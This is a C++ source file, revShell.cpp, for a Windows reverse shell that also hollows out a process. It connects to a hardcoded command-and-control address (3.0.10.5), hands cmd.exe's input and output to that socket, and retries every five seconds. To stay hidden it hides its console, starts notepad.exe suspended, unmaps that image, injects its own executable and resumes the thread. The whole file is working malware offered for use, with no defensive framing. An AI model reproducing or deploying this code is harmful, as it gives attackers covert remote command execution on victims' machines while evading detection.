// revShell.cpp : Defines the entry point for the console application.
// Project -> Properties -> General -> Character Set -> "No set"
// Project -> Properties -> C/C++ -> Code Generation -> Runtime Library -> "/MD"
// Project -> Properties -> C/C++ -> Precompiled Headers -> Precompiled Header -> "Not Using Precompiled Header"



#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include <fstream>
#include <vector>
#include <winternl.h>
#include <future>

//#include <tchar.h>
//#include <iterator>
//#include <filesystem>
//#include <TlHelp32.h>



#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	_In_      HANDLE           ProcessHandle,
	_In_      PROCESSINFOCLASS ProcessInformationClass,
	_Out_     PVOID            ProcessInformation,
	_In_      ULONG            ProcessInformationLength,
	_Out_opt_ PULONG           ReturnLength
	);

typedef NTSTATUS(WINAPI* _ZwUnmapViewOfSection)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

void RunShell(char* C2Server, int C2Port) {
	while (true) {
		Sleep(5000);    // 1000 = One Second

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
		addr.sin_port = htons(C2Port);     //Port received from main function

										   //Connecting to Proxy/ProxyIP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else {
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else {
				char Process[] = "cmd.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}
	}
}

struct PE_FILE
{
	size_t size_ids{};
	size_t size_dos_stub{};
	size_t size_inh32{};
	size_t size_ish{};
	size_t size_sections{};
	IMAGE_DOS_HEADER ids;
	std::vector<char> MS_DOS_STUB;
	IMAGE_NT_HEADERS64 inh32;
	std::vector<IMAGE_SECTION_HEADER> ish;
	std::vector<std::shared_ptr<char>> Sections;
	void set_sizes(size_t, size_t, size_t, size_t, size_t);
};


void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
{
	this->size_ids = size_ids_;
	this->size_dos_stub = size_dos_stub_;
	this->size_inh32 = size_inh32_;
	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
	this->size_sections = size_sections_;
}

PE_FILE ParsePE(const char* PE)
{
	PE_FILE pefile{};
	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
	pefile.MS_DOS_STUB = std::vector<char>(stub_size);
	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);

	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
	pefile.ish = std::vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // Number of sections

	auto PE_Header = PE + pefile.ids.e_lfanew;
	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header

																								 // copy section headers
	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
	}

	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		std::shared_ptr<char> t_char(new char[pefile.ish[i].SizeOfRawData]{}, std::default_delete<char[]>()); // Section
		memcpy_s(t_char.get(), pefile.ish[i].SizeOfRawData, PE + pefile.ish[i].PointerToRawData, pefile.ish[i].SizeOfRawData); // copy sections.
		pefile.Sections.push_back(t_char);
	}
	size_t sections_size{};
	for (WORD i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		sections_size += pefile.ish[i].SizeOfRawData;
	}

	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

	return pefile;
}

std::tuple<bool, char*, std::streampos> OpenBinary(char *filename)
{
	auto flag = false;  // assume failure
	std::fstream::pos_type size{};  // create filesize as fstream object
	char* bin{}; // create char pointer object


	std::ifstream ifile(filename, std::ios::binary | std::ios::in | std::ios::ate);
	if (ifile.is_open())
	{
		size = ifile.tellg();  // set size to current filepointer location (tellg method of istream)
		bin = new char[size];  //create (in stack) the new char buffer for the binry 
							   //Standard get filezise algorithm
		ifile.seekg(0, std::ios::beg);
		ifile.read(bin, size);
		ifile.close();

		flag = true;
	}
	return make_tuple(flag, bin, size); // return tuple of gathered data
}

bool ProcessReplacement(char *source_pe, char *target_exe) {
	std::tuple<bool, char*, std::fstream::pos_type>  bin = OpenBinary(source_pe);
	if (!std::get<0>(bin)) // verify that tuple exists (file is open)
	{
		return EXIT_FAILURE;
	}
	auto PE_file = std::get<1>(bin); // get pointer to binary as char array
	int size = std::get<2>(bin);  //get the filesize from the OpenBinary call
	auto Parsed_PE = ParsePE(PE_file);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	DWORD pid = 0;
	DWORD id;
	SIZE_T ByteOfWriten;
	
	if (CreateProcess(NULL, target_exe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		pid = pi.dwProcessId;
	
	auto handleToRemoteNtDll = LoadLibrary("ntdll");   //Locate NTDLL in new process memory
	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);

	DWORD dwReturnLength;   //used later in remote call
	PROCESS_BASIC_INFORMATION ProcessBasicInformation;	// read remote PEB
	//Call remote process NtQueryInformationProcess function
	remoteNtQueryInformationProcess(pi.hProcess,
		PROCESSINFOCLASS(0),
		&ProcessBasicInformation,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength);

	auto dwPEBBAddress = ProcessBasicInformation.PebBaseAddress; //remote PEB info
	auto pPEB = new PEB(); //create new PEB object
	ReadProcessMemory(pi.hProcess, // load info for PEB of remote process 
		static_cast<LPCVOID>(dwPEBBAddress),
		pPEB,
		sizeof(PEB),
		nullptr);
	
	// Comment if necessary. If the code is used in other project it can crash without this hook
	// Hook remote process for correct start 
	auto dwProcessParametersAddress = pPEB->ProcessParameters;		// get pointer to remote ProcessParameters 
	auto pProcessParameters = new _RTL_USER_PROCESS_PARAMETERS();	// create new _RTL_USER_PROCESS_PARAMETERS object
	if (!ReadProcessMemory(pi.hProcess,								// read remote ParametersAddress
		static_cast<LPCVOID>(dwProcessParametersAddress),
		pProcessParameters,
		sizeof(_RTL_USER_PROCESS_PARAMETERS),
		nullptr)) {
		puts("[-] failed to load remote ProcessParameters");
		return FALSE;
	}

	pProcessParameters->Reserved2[0] = 0;		// set ConsoleHandler (field Reserved2[0] in _RTL_USER_PROCESS_PARAMETERS object structure) to zero
												// otherwise get error 0xc0000142 and unload of dll's

	// Write changed structure to remote process
	BOOL wp = WriteProcessMemory(pi.hProcess,				//hProcess                  the handle to the remote process
		static_cast<LPVOID>(dwProcessParametersAddress),	//lpBaseAddress             The address to start writing to
		pProcessParameters,									//lpBuffer                  the buffer to write to the process
		sizeof(_RTL_USER_PROCESS_PARAMETERS),				//nSize                     number of bytes to write
		&ByteOfWriten);										//lpNumberOfBytesWritten    (unused) int pointer to write the return value to
	if (wp == NULL) {
		puts("[-] failed to write new headers to remote process memory");
		return FALSE;
	}
	// Hook finished
	
	// remote image size calculation
	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;

	auto remoteProcessBuffer = new BYTE[BUFFER_SIZE];

	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote processes' image base
	ReadProcessMemory(pi.hProcess, // read process image from loaded process (so we can replace these parts later)
		remoteImageAddressBase,
		remoteProcessBuffer,
		BUFFER_SIZE,
		nullptr);

	// get handle to unmap remote process sections for replacement
	auto fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
	//Create callable version of remote unmap call
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	ZwUnmapViewOfSection(pi.hProcess, const_cast<PVOID>(remoteImageAddressBase));

	// Allocating memory for our PE file
	/*

	MSDN: https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa366890(v=vs.85).aspx
	*/
	
	LPVOID alloc = (char*)VirtualAllocEx(pi.hProcess,	//hProcess          handle to the remote process
		const_cast<LPVOID>(remoteImageAddressBase),		//lpAddress         address to allocate at (here we are using the old process image base address)
		Parsed_PE.inh32.OptionalHeader.SizeOfImage,		//dwSize            size of  allocation (our new pe's length goes here 
		MEM_COMMIT | MEM_RESERVE,						//flAllocationType  The type of memory allocation this part is system magic so RTFM at MSDN
		PAGE_EXECUTE_READWRITE);						//flProtect         Tell the kernel to allocate with these protections, which is none so... "RAWDOG IT!!!"
	if (alloc == NULL) return 0;

	BOOL w = WriteProcessMemory(pi.hProcess,		//hProcess                  the handle to the remote process
		alloc,										//lpBaseAddress             The address to start writing to
		PE_file,									//lpBuffer                  the buffer to write to the process
		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,//nSize                     number of bytes to write
		&ByteOfWriten);								//lpNumberOfBytesWritten    (unused) int pointer to write the return value to
	if (w == NULL) return 0;

	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
	{
		auto VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);

		w = WriteProcessMemory(pi.hProcess,    //write new sections to the remote processes' memory 
			VirtAddress,
			Parsed_PE.Sections[i].get(),
			Parsed_PE.ish[i].SizeOfRawData,
			nullptr);
		if (w == NULL) return 0;
	}

	auto dwEntrypoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;

	LPCONTEXT remoteProcessContext = new CONTEXT();     //This is a debugging structure to hold the old process "context" like registers and whatnot
	remoteProcessContext->ContextFlags = CONTEXT_FULL;  // A value indicating which portions of the Context structure should be initialized. This parameter influences the size of the initialized Context structure.
		
	if (!GetThreadContext(pi.hThread, remoteProcessContext)) { //get context to be used to restore process
		return FALSE;
	}

	remoteProcessContext->Rcx = dwEntrypoint;           //Set RCX register to the EntryPoint

	SetThreadContext(pi.hThread, remoteProcessContext);
	
	GetThreadContext(pi.hThread, remoteProcessContext);
	
	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	return 0;
}


int main(int argc, char **argv) {
	
	FreeConsole();
	if (argc == 3) {
		int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
		RunShell(argv[1], port);
	}
	else {
		char host[] = "3.0.10.5";
		int port = 80;
		//RunShell(host, port);
	}
	//char inj_pe[] = "C:\\revShell.exe";
	char target[] = "notepad.exe 3.0.10.5 8080"; // parameters from target process will be appalyed to inj_pe
	ProcessReplacement(argv[0], target);
	
	return 0;
}

